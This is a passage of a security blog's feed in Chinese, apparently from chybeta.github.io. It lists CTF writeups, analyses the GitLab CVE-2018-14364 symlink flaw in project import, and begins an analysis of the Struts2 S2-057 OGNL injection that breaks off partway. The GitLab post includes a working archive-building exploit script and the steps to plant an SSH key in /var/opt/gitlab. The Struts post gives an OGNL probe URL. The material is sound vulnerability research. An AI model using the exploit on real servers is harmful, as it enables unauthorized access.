<li><a href="https://chybeta.github.io/2017/06/28/SUCTF-2016-pwn400-writeup/">SUCTF-2016-pwn400-writeup</a></li>
</ul>
<h3 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-shellshock/">Pwnable.kr:shellshock</a></li>
<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-mistake/">Pwnable.kr:mistake</a></li>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/">Pwnable.kr:random </a></li>
<li><a href="https://chybeta.github.io/2017/04/08/Pwnable-kr-passcode/">Pwnable.kr:passcode</a></li>
<li><a href="https://chybeta.github.io/2017/04/07/Pwnable-kr-bof/">Pwnable.kr:bof</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="https://chybeta.github.io/2017/10/07/CSAW-CTF-2017-MISC-writeup/">CSAW CTF 2017-MISC-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/11/ASISCTF2017-ASIS-secret-letter-writeup/">ASISCTF2017-ASIS secret letter-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/30/Hackit2017-Cypherpunk%E2%80%99s-nightmare-writeup/">Hackit2017-Cypherpunk’s nightmare-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/30/Hackit2017-USB-ducker-writeup/">Hackit2017-USB ducker-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/28/ISG2017-%E8%B5%9B%E5%89%8D%E7%BB%83%E6%89%8B%E9%A2%98%E2%80%94writeup/">ISG2017-赛前练手题—writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/27/HackCon2017-Steg-writeup/">HackCon2017-Steg-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Growing-Up-writeup/">SHACTF-2017-Growing Up-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-WannaFly-writeup/">SHACTF-2017-WannaFly-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-misc-writeup/">BugsBunnyCTF2017-misc-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/23/0ctf-2015-Peers-writeup/">0ctf-2015-Peers-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/17/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-misc-writeup/">XMAN选拔赛-2017-misc-writeup</a></li>
</ul>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><ul>
<li><a href="https://chybeta.github.io/2017/09/12/ASISCTF2017-Simple-Crypto-writeup/">ASISCTF2017-Simple Crypto-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-crypto-writeup/">BugsBunnyCTF2017-crypto-writeup</a></li>
<li><a href="Meenpwn-2017-crypto-writeup">Meenpwn-2017-crypto-writeup</a></li>
</ul>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><ul>
<li><a href="https://chybeta.github.io/2017/09/02/TWCTF-2017-Rev-Rev-Rev-writeup/">TWCTF 2017-Rev Rev Rev-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-Reverse-writeup/">BugsBunnyCTF2017-Reverse-writeup</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一些自己写的文章。&lt;br&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://chybeta.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
      <category term="pwn" scheme="http://chybeta.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>GitLab远程代码执行漏洞分析 -【CVE-2018-14364】</title>
    <link href="http://chybeta.github.io/2018/09/10/GitLab%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-14364%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/</id>
    <published>2018-09-10T00:04:23.000Z</published>
    <updated>2018-09-10T00:06:09.806Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2661" target="_blank" rel="external">GitLab远程代码执行漏洞分析 -【CVE-2018-14364】</a></p>
<a id="more"></a>
<h1 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h1><p>2018年7月17日，Gitlab官方发布安全更新版本，修复了一个<a href="https://about.gitlab.com/2018/07/17/critical-security-release-gitlab-11-dot-0-dot-4-released/" target="_blank" rel="external">远程命令执行漏洞</a>，CVE ID为CVE-2018-14364，该漏洞由长亭研究人员发现，并在<a href="https://hackerone.com/reports/378148" target="_blank" rel="external">hackerone平台</a>提交</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191947-7061390a-ab7d-1.png" alt="1.jpg"></p>
<p>影响版本：&gt;= 8.9.0<br>修复版本：11.0.4, 10.8.6, and 10.7.7</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>以版本11.0.3为例。根据<a href="https://gitlab.com/gitlab-org/gitlab-ce/compare/v11.0.3...v11.0.4" target="_blank" rel="external">版本源码对比</a></p>
<p>从CHANGELOG.md中得知为<code>Fix symlink vulnerability in project import</code></p>
<p>主要修改的代码文件为lib/gitlab/import_export/file_importer.rb</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191948-707e9eb4-ab7d-1.png" alt="2.jpg"></p>
<p>主要关注一下<code>extracted_files</code>。</p>
<p>当我们import一个项目时，会进入到<code>file_import.rb</code>。然后调用第17行的：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">import</span></span></div><div class="line">    mkdir_p(@shared.export_path)</div><div class="line"></div><div class="line">    remove_symlinks!</div><div class="line"></div><div class="line">    wait_for_archived_file <span class="keyword">do</span></div><div class="line">        decompress_archive</div><div class="line">     <span class="keyword">end</span></div><div class="line"><span class="keyword">rescue</span> =&gt; e</div><div class="line">    @shared.error(e)</div><div class="line">    <span class="literal">false</span></div><div class="line"><span class="keyword">ensure</span></div><div class="line">    remove_symlinks!    </div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p><code>remove_symlinks</code>用于删除导入文件中存在的符号链接。此前gitlab就因为符号链接的问题爆出过多个RCE问题，因此在这里做了检查：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_symlinks!</span></span></div><div class="line">    extracted_files.each <span class="keyword">do</span> <span class="params">|path|</span></div><div class="line">       FileUtils.rm(path) <span class="keyword">if</span> File.lstat(path).symlink?</div><div class="line">    <span class="keyword">end</span></div><div class="line"></div><div class="line">    <span class="literal">true</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>而<code>extracted_files</code>定义在61行，这个方法用于列出解压出来的所有文件。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">extracted_files</span></span></div><div class="line">    Dir.glob(<span class="string">"<span class="subst">#&#123;@shared.export_path&#125;</span>/**/*"</span>, File::FNM_DOTMATCH).reject &#123; <span class="params">|f|</span> f =~ <span class="regexp">%r&#123;.*/\.&#123;1,2&#125;</span>$&#125; &#125;</div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>在<a href="https://ruby-doc.org/core-2.5.1/Regexp.html" target="_blank" rel="external">ruby</a>中,关于正则表达式的符号定义如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191948-70a75304-ab7d-1.png" alt="3.jpg"></p>
<p>也就是说<code>%r{.*/\.{1,2}$}</code>这个正则表达式最后的<code>$</code>只能匹配到一行的末尾（Matches end of line），而不是整个字符串的末尾（Matches end of string）。</p>
<p>根据<a href="http://pubs.opengroup.org/onlinepubs/009695399/basedefs/xbd_chap03.html#tag_03_169" target="_blank" rel="external">POSIX 标准</a>，对于文件名（filename）除了slash character<code>/</code>和null byte <code>NULL</code>外，其余字符均可以：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191948-70d2d358-ab7d-1.png" alt="4.jpg"></p>
<p>所以只要创建一个名字以<code>\n</code>开头的符号链接文件，就无法被<code>extracted_files</code>列出。</p>
<p>回到<a href="https://gitlab.com/gitlab-org/gitlab-ce/compare/v11.0.3...v11.0.4" target="_blank" rel="external">版本源码对比</a>，在测试文件file_importer_spec.rb里：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191948-70fb58d2-ab7d-1.png" alt="5.jpg"></p>
<p>因此构建测试环境：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">require</span> <span class="string">"tmpdir"</span></div><div class="line">puts <span class="string">"The temp dir is: <span class="subst">#&#123;Dir.tmpdir&#125;</span>"</span></div><div class="line"></div><div class="line">export_path=<span class="string">"<span class="subst">#&#123;Dir.tmpdir&#125;</span>/file_importer"</span></div><div class="line">evil_symlink_file=<span class="string">"<span class="subst">#&#123;export_path&#125;</span>/.\nevil"</span></div><div class="line">valid_file=<span class="string">"<span class="subst">#&#123;export_path&#125;</span>/valid.json"</span></div><div class="line"></div><div class="line">FileUtils.mkdir_p(<span class="string">"<span class="subst">#&#123;export_path&#125;</span>/subfolder/"</span>)</div><div class="line">FileUtils.touch(valid_file)</div><div class="line">FileUtils.ln_s(valid_file, evil_symlink_file)</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191949-711ddbd2-ab7d-1.png" alt="6.jpg"></p>
<p>可以看到原本的正则表达式是无法检测到<code>\nevil</code>文件的：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191949-713cc3ee-ab7d-1.png" alt="7.jpg"></p>
<h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><p>提供一下压缩包生成脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> shutil</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">step_one</span><span class="params">()</span>:</span></div><div class="line">        os.chdir(uploads_dir)</div><div class="line">        gitlab_dir = <span class="string">"/var/opt/gitlab"</span></div><div class="line">        evil_symlink_name = <span class="string">".\nevil"</span></div><div class="line">        os.symlink(gitlab_dir, evil_symlink_name)</div><div class="line">        os.chdir(exp_dir)</div><div class="line">        os.system(<span class="string">"tar -czf ../step1.tar.gz  . &amp;&amp; rm -r uploads &amp;&amp; mkdir uploads"</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">step_two</span><span class="params">()</span>:</span></div><div class="line">        os.chdir(uploads_dir)</div><div class="line">        evil_ssh_dir_name = <span class="string">".\nevil/.ssh"</span></div><div class="line">        os.makedirs(evil_ssh_dir_name)</div><div class="line">        evil_dir = os.getcwd() + <span class="string">"/"</span> + evil_ssh_dir_name</div><div class="line">        os.chdir(evil_dir)</div><div class="line">        shutil.copy(authorized_keys,<span class="string">"authorized_keys"</span>)</div><div class="line">        os.chdir(exp_dir)</div><div class="line">        os.system(<span class="string">"tar -czf ../step2.tar.gz  . &amp;&amp; rm -r uploads &amp;&amp; mkdir uploads"</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">        uploads_dir = os.getcwd() + <span class="string">"/evil/uploads"</span></div><div class="line">        exp_dir = os.getcwd() + <span class="string">"/evil"</span></div><div class="line">        authorized_keys = os.getcwd() + <span class="string">"/key.pub"</span></div><div class="line">        step_one()</div><div class="line">        step_two()</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191949-715755c4-ab7d-1.png" alt="13.jpg"></p>
<p>key.pub里保存公钥。其余文件见文末附件压缩包。</p>
<p>创建项目project ，选择<code>Import project</code>后选择<code>Import an exported GitLab project</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191949-7173be94-ab7d-1.png" alt="8.jpg"></p>
<p>待导入成功后，如下图：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191950-71a2d4d6-ab7d-1.png" alt="9.jpg"></p>
<p>注意此时的项目名为<code>test</code>，同时右下角有一个<code>Remove project</code>，点击删除掉project，然而此时在gitlab的目录下，<code>test</code>还没有被删除。</p>
<p>新建一个project，仍然采用<code>Import an exported GitLab project</code>，然后上传第二个压缩包</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191950-71c0a5ce-ab7d-1.png" alt="11.jpg"></p>
<p>第二个压缩包的内容如下，<code>\nevil</code>是目录名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">VERSION</div><div class="line">project.json</div><div class="line">uploads/</div><div class="line">uploads/.\nevil/</div><div class="line">uploads/.\nevil/.ssh/</div><div class="line">uploads/.\nevil/.ssh/authorized_keys</div></pre></td></tr></table></figure></p>
<p>gitlab在解压第二个压缩包时，会尝试往目录<code>\nevil</code>里写入<code>.ssh/authorized_keys</code>，而由于上一步的符号链接<code>\nevil</code>没有删除，所以实际写入的目录是<code>/var/opt/gitlab/.ssh/authorized_keys</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191950-71ea8628-ab7d-1.png" alt="12.jpg"></p>
<p>可以看到<code>authorized_keys</code>已经被写入了公钥。此后用用户名git和公钥对应的私钥直接ssh连接服务器即可。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-14364" target="_blank" rel="external">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-14364</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2661&quot;&gt;GitLab远程代码执行漏洞分析 -【CVE-2018-14364】&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="ruby" scheme="http://chybeta.github.io/tags/ruby/"/>
    
      <category term="gitlab" scheme="http://chybeta.github.io/tags/gitlab/"/>
    
  </entry>
  
  <entry>
    <title>【Struts2-代码执行漏洞分析系列】S2-057</title>
    <link href="http://chybeta.github.io/2018/09/10/%E3%80%90Struts2-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-057/"/>
    <id>http://chybeta.github.io/2018/09/10/【Struts2-代码执行漏洞分析系列】S2-057/</id>
    <published>2018-09-10T00:01:31.000Z</published>
    <updated>2018-09-10T00:04:08.039Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2618" target="_blank" rel="external">【Struts2-代码执行漏洞分析系列】S2-057</a></p>
<a id="more"></a>
<h1 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h1><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-057" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-057</a></p>
<p>问题：<br>It is possible to perform a RCE attack when namespace value isn’t set for a result defined in underlying xml configurations and in same time, its upper action(s) configurations have no or wildcard namespace. Same possibility when using url tag which doesn’t have value and action set and in same time, its upper action(s) configurations have no or wildcard namespace.</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142551-6186f580-a69d-1.png" alt="1.png"></p>
<p>漏洞发现者的博客： <a href="https://lgtm.com/blog/apache_struts_CVE-2018-11776" target="_blank" rel="external">https://lgtm.com/blog/apache_struts_CVE-2018-11776</a></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载 <a href="https://archive.apache.org/dist/struts/2.5.16/struts-2.5.16-all.zip" target="_blank" rel="external">https://archive.apache.org/dist/struts/2.5.16/struts-2.5.16-all.zip</a></p>
<p>IDEA中打开，修改apps/showcase/src/main/resources/struts-actionchaining.xml 为：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></div><div class="line">	"-//Apache Software Foundation//DTD Struts Configuration 2.5//EN"</div><div class="line">	"http://struts.apache.org/dtds/struts-2.5.dtd"&gt;</div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"actionchaining"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"actionChain1"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.showcase.actionchaining.ActionChain1"</span>&gt;</span></div><div class="line">			<span class="tag">&lt;<span class="name">result</span> <span class="attr">type</span>=<span class="string">"redirectAction"</span>&gt;</span></div><div class="line">				<span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span> = <span class="string">"actionName"</span>&gt;</span>register2<span class="tag">&lt;/<span class="name">param</span>&gt;</span></div><div class="line">			<span class="tag">&lt;/<span class="name">result</span>&gt;</span></div><div class="line">		<span class="tag">&lt;/<span class="name">action</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">package</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>同时查看 org/apache/struts2/default.properties:201 ，其值为true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">### Whether to always select the namespace to be everything before the last slash or not</div><div class="line">struts.mapper.alwaysSelectFullNamespace=true</div></pre></td></tr></table></figure></p>
<p>访问: <a href="http://localhost:8081/${(111+111)}/actionChain1.action" target="_blank" rel="external">http://localhost:8081/${(111+111)}/actionChain1.action</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142551-61995536-a69d-1.gif" alt="2.gif"></p>
<p>url变为： <a href="http://localhost:8081/222/register2.action" target="_blank" rel="external">http://localhost:8081/222/register2.action</a></p>
<p>111+111=222 即产生了OGNL注入。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>这次的漏洞可以有多种攻击向量，根据<a href="https://lgtm.com/blog/apache_struts_CVE-2018-11776" target="_blank" rel="external">漏洞作者blog</a>有:</p>
<ol>
<li><a href="https://struts.apache.org/core-developers/redirect-action-result.html" target="_blank" rel="external">Redirect action</a></li>
<li><a href="https://struts.apache.org/core-developers/action-chaining.html" target="_blank" rel="external">Action chaining</a></li>
<li><a href="https://struts.apache.org/core-developers/postback-result.html" target="_blank" rel="external">Postback result</a></li>
</ol>
<p>以上提及的三种都属于Struts2的跳转方式。在 struts-default.xml:190(截取部分)<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">result-types</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"chain"</span> <span class="attr">class</span>=<span class="string">"com.opensymphony.xwork2.ActionChainResult"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"redirectAction"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.result.ServletActionRedirectResult"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"postback"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.result.PostbackResult"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">result-types</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>为清楚起见，这里解释一下strut2中对<code>默认result对象</code>的处理过程。这些<code>默认result type</code>都要经过 com/opensymphony/xwork2/DefaultActionInvocation.java:367 处理<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">executeResult</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">    result = createResult();</div><div class="line"></div><div class="line">    String timerKey = <span class="string">"executeResult: "</span> + getResultCode();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        UtilTimerStack.push(timerKey);</div><div class="line">        <span class="keyword">if</span> (result != <span class="keyword">null</span>) &#123;</div><div class="line">            result.execute(<span class="keyword">this</span>);</div><div class="line">        &#125; </div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>首先通过<code>result = createResult()</code>获取到相应的result对象。如果result不为null则执行<code>result.execute(this);</code>。这个<code>execute</code>方法则由具体result对象实现。</p>
<p>有一些具体的result对象比如下面提到的Redirect action和Postback result，会产生一个跳转地址location，并传入org/apache/struts2/result/StrutsResultSupport.java:194:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">    * Implementation of the &lt;tt&gt;execute&lt;/tt&gt; method from the &lt;tt&gt;Result&lt;/tt&gt; interface. This will call</div><div class="line">    * the abstract method &#123;<span class="doctag">@link</span> #doExecute(String, ActionInvocation)&#125; after optionally evaluating the</div><div class="line">    * location as an OGNL evaluation.</div><div class="line">    *</div><div class="line">    * <span class="doctag">@param</span> invocation the execution state of the action.</div><div class="line">    * <span class="doctag">@throws</span> Exception if an error occurs while executing the result.</div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">    lastFinalLocation = conditionalParse(location, invocation);</div><div class="line">    doExecute(lastFinalLocation, invocation);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>而<code>conditionalParse</code>定义如下，将会执行OGNL表达式。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">    * Parses the parameter for OGNL expressions against the valuestack</div><div class="line">    *</div><div class="line">    * <span class="doctag">@param</span> param The parameter value</div><div class="line">    * <span class="doctag">@param</span> invocation The action invocation instance</div><div class="line">    * <span class="doctag">@return</span> the resulting string</div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">conditionalParse</span><span class="params">(String param, ActionInvocation invocation)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (parse &amp;&amp; param != <span class="keyword">null</span> &amp;&amp; invocation != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">return</span> TextParseUtil.translateVariables(</div><div class="line">            param, </div><div class="line">            invocation.getStack(),</div><div class="line">            <span class="keyword">new</span> EncodingParsedValueEvaluator());</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> param;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>所以可以看到重点是StrutsResultSupport中<code>conditionalParse(location, invocation)</code>的location变量。</p>
<p>接下来部分就关注三种result-type的具体实现和具体攻击点。</p>
<h2 id="攻击点一：Redirect-action"><a href="#攻击点一：Redirect-action" class="headerlink" title="攻击点一：Redirect action"></a>攻击点一：<a href="https://struts.apache.org/core-developers/redirect-action-result.html" target="_blank" rel="external">Redirect action</a></h2><p>apps/showcase/src/main/resources/struts-actionchaining.xml 中注意<code>&lt;result&gt;</code>标签中<code>&lt;type&gt;</code>为<code>redirectAction</code>：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">type</span>=<span class="string">"redirectAction"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span> = <span class="string">"actionName"</span>&gt;</span>register2<span class="tag">&lt;/<span class="name">param</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p><code>redirectAction</code>对应的处理类为<code>org.apache.struts2.result.ServletActionRedirectResult</code></p>
<p>在 com/opensymphony/xwork2/DefaultActionInvocation.java:368</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142551-61bfb9f6-a69d-1.png" alt="5.png"></p>
<p>跟入<code>redirectAction</code>的<code>execute</code>方法即 org/apache/struts2/result/ServletActionRedirectResult.java:160<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">    actionName = conditionalParse(actionName, invocation);</div><div class="line">    <span class="keyword">if</span> (namespace == <span class="keyword">null</span>) &#123;</div><div class="line">        namespace = invocation.getProxy().getNamespace();</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142551-61dc87d4-a69d-1.png" alt="6.png"></p>
<p>由于在配置xml时没有指定naPmespace，所以这里的namespace为null，将会执行<code>invocation.getProxy().getNamespace();</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142551-61f31a76-a69d-1.png" alt="7.png"></p>
<p>所以执行后对于result对象的namespace即为<code>/${(111+111)}</code>。</p>
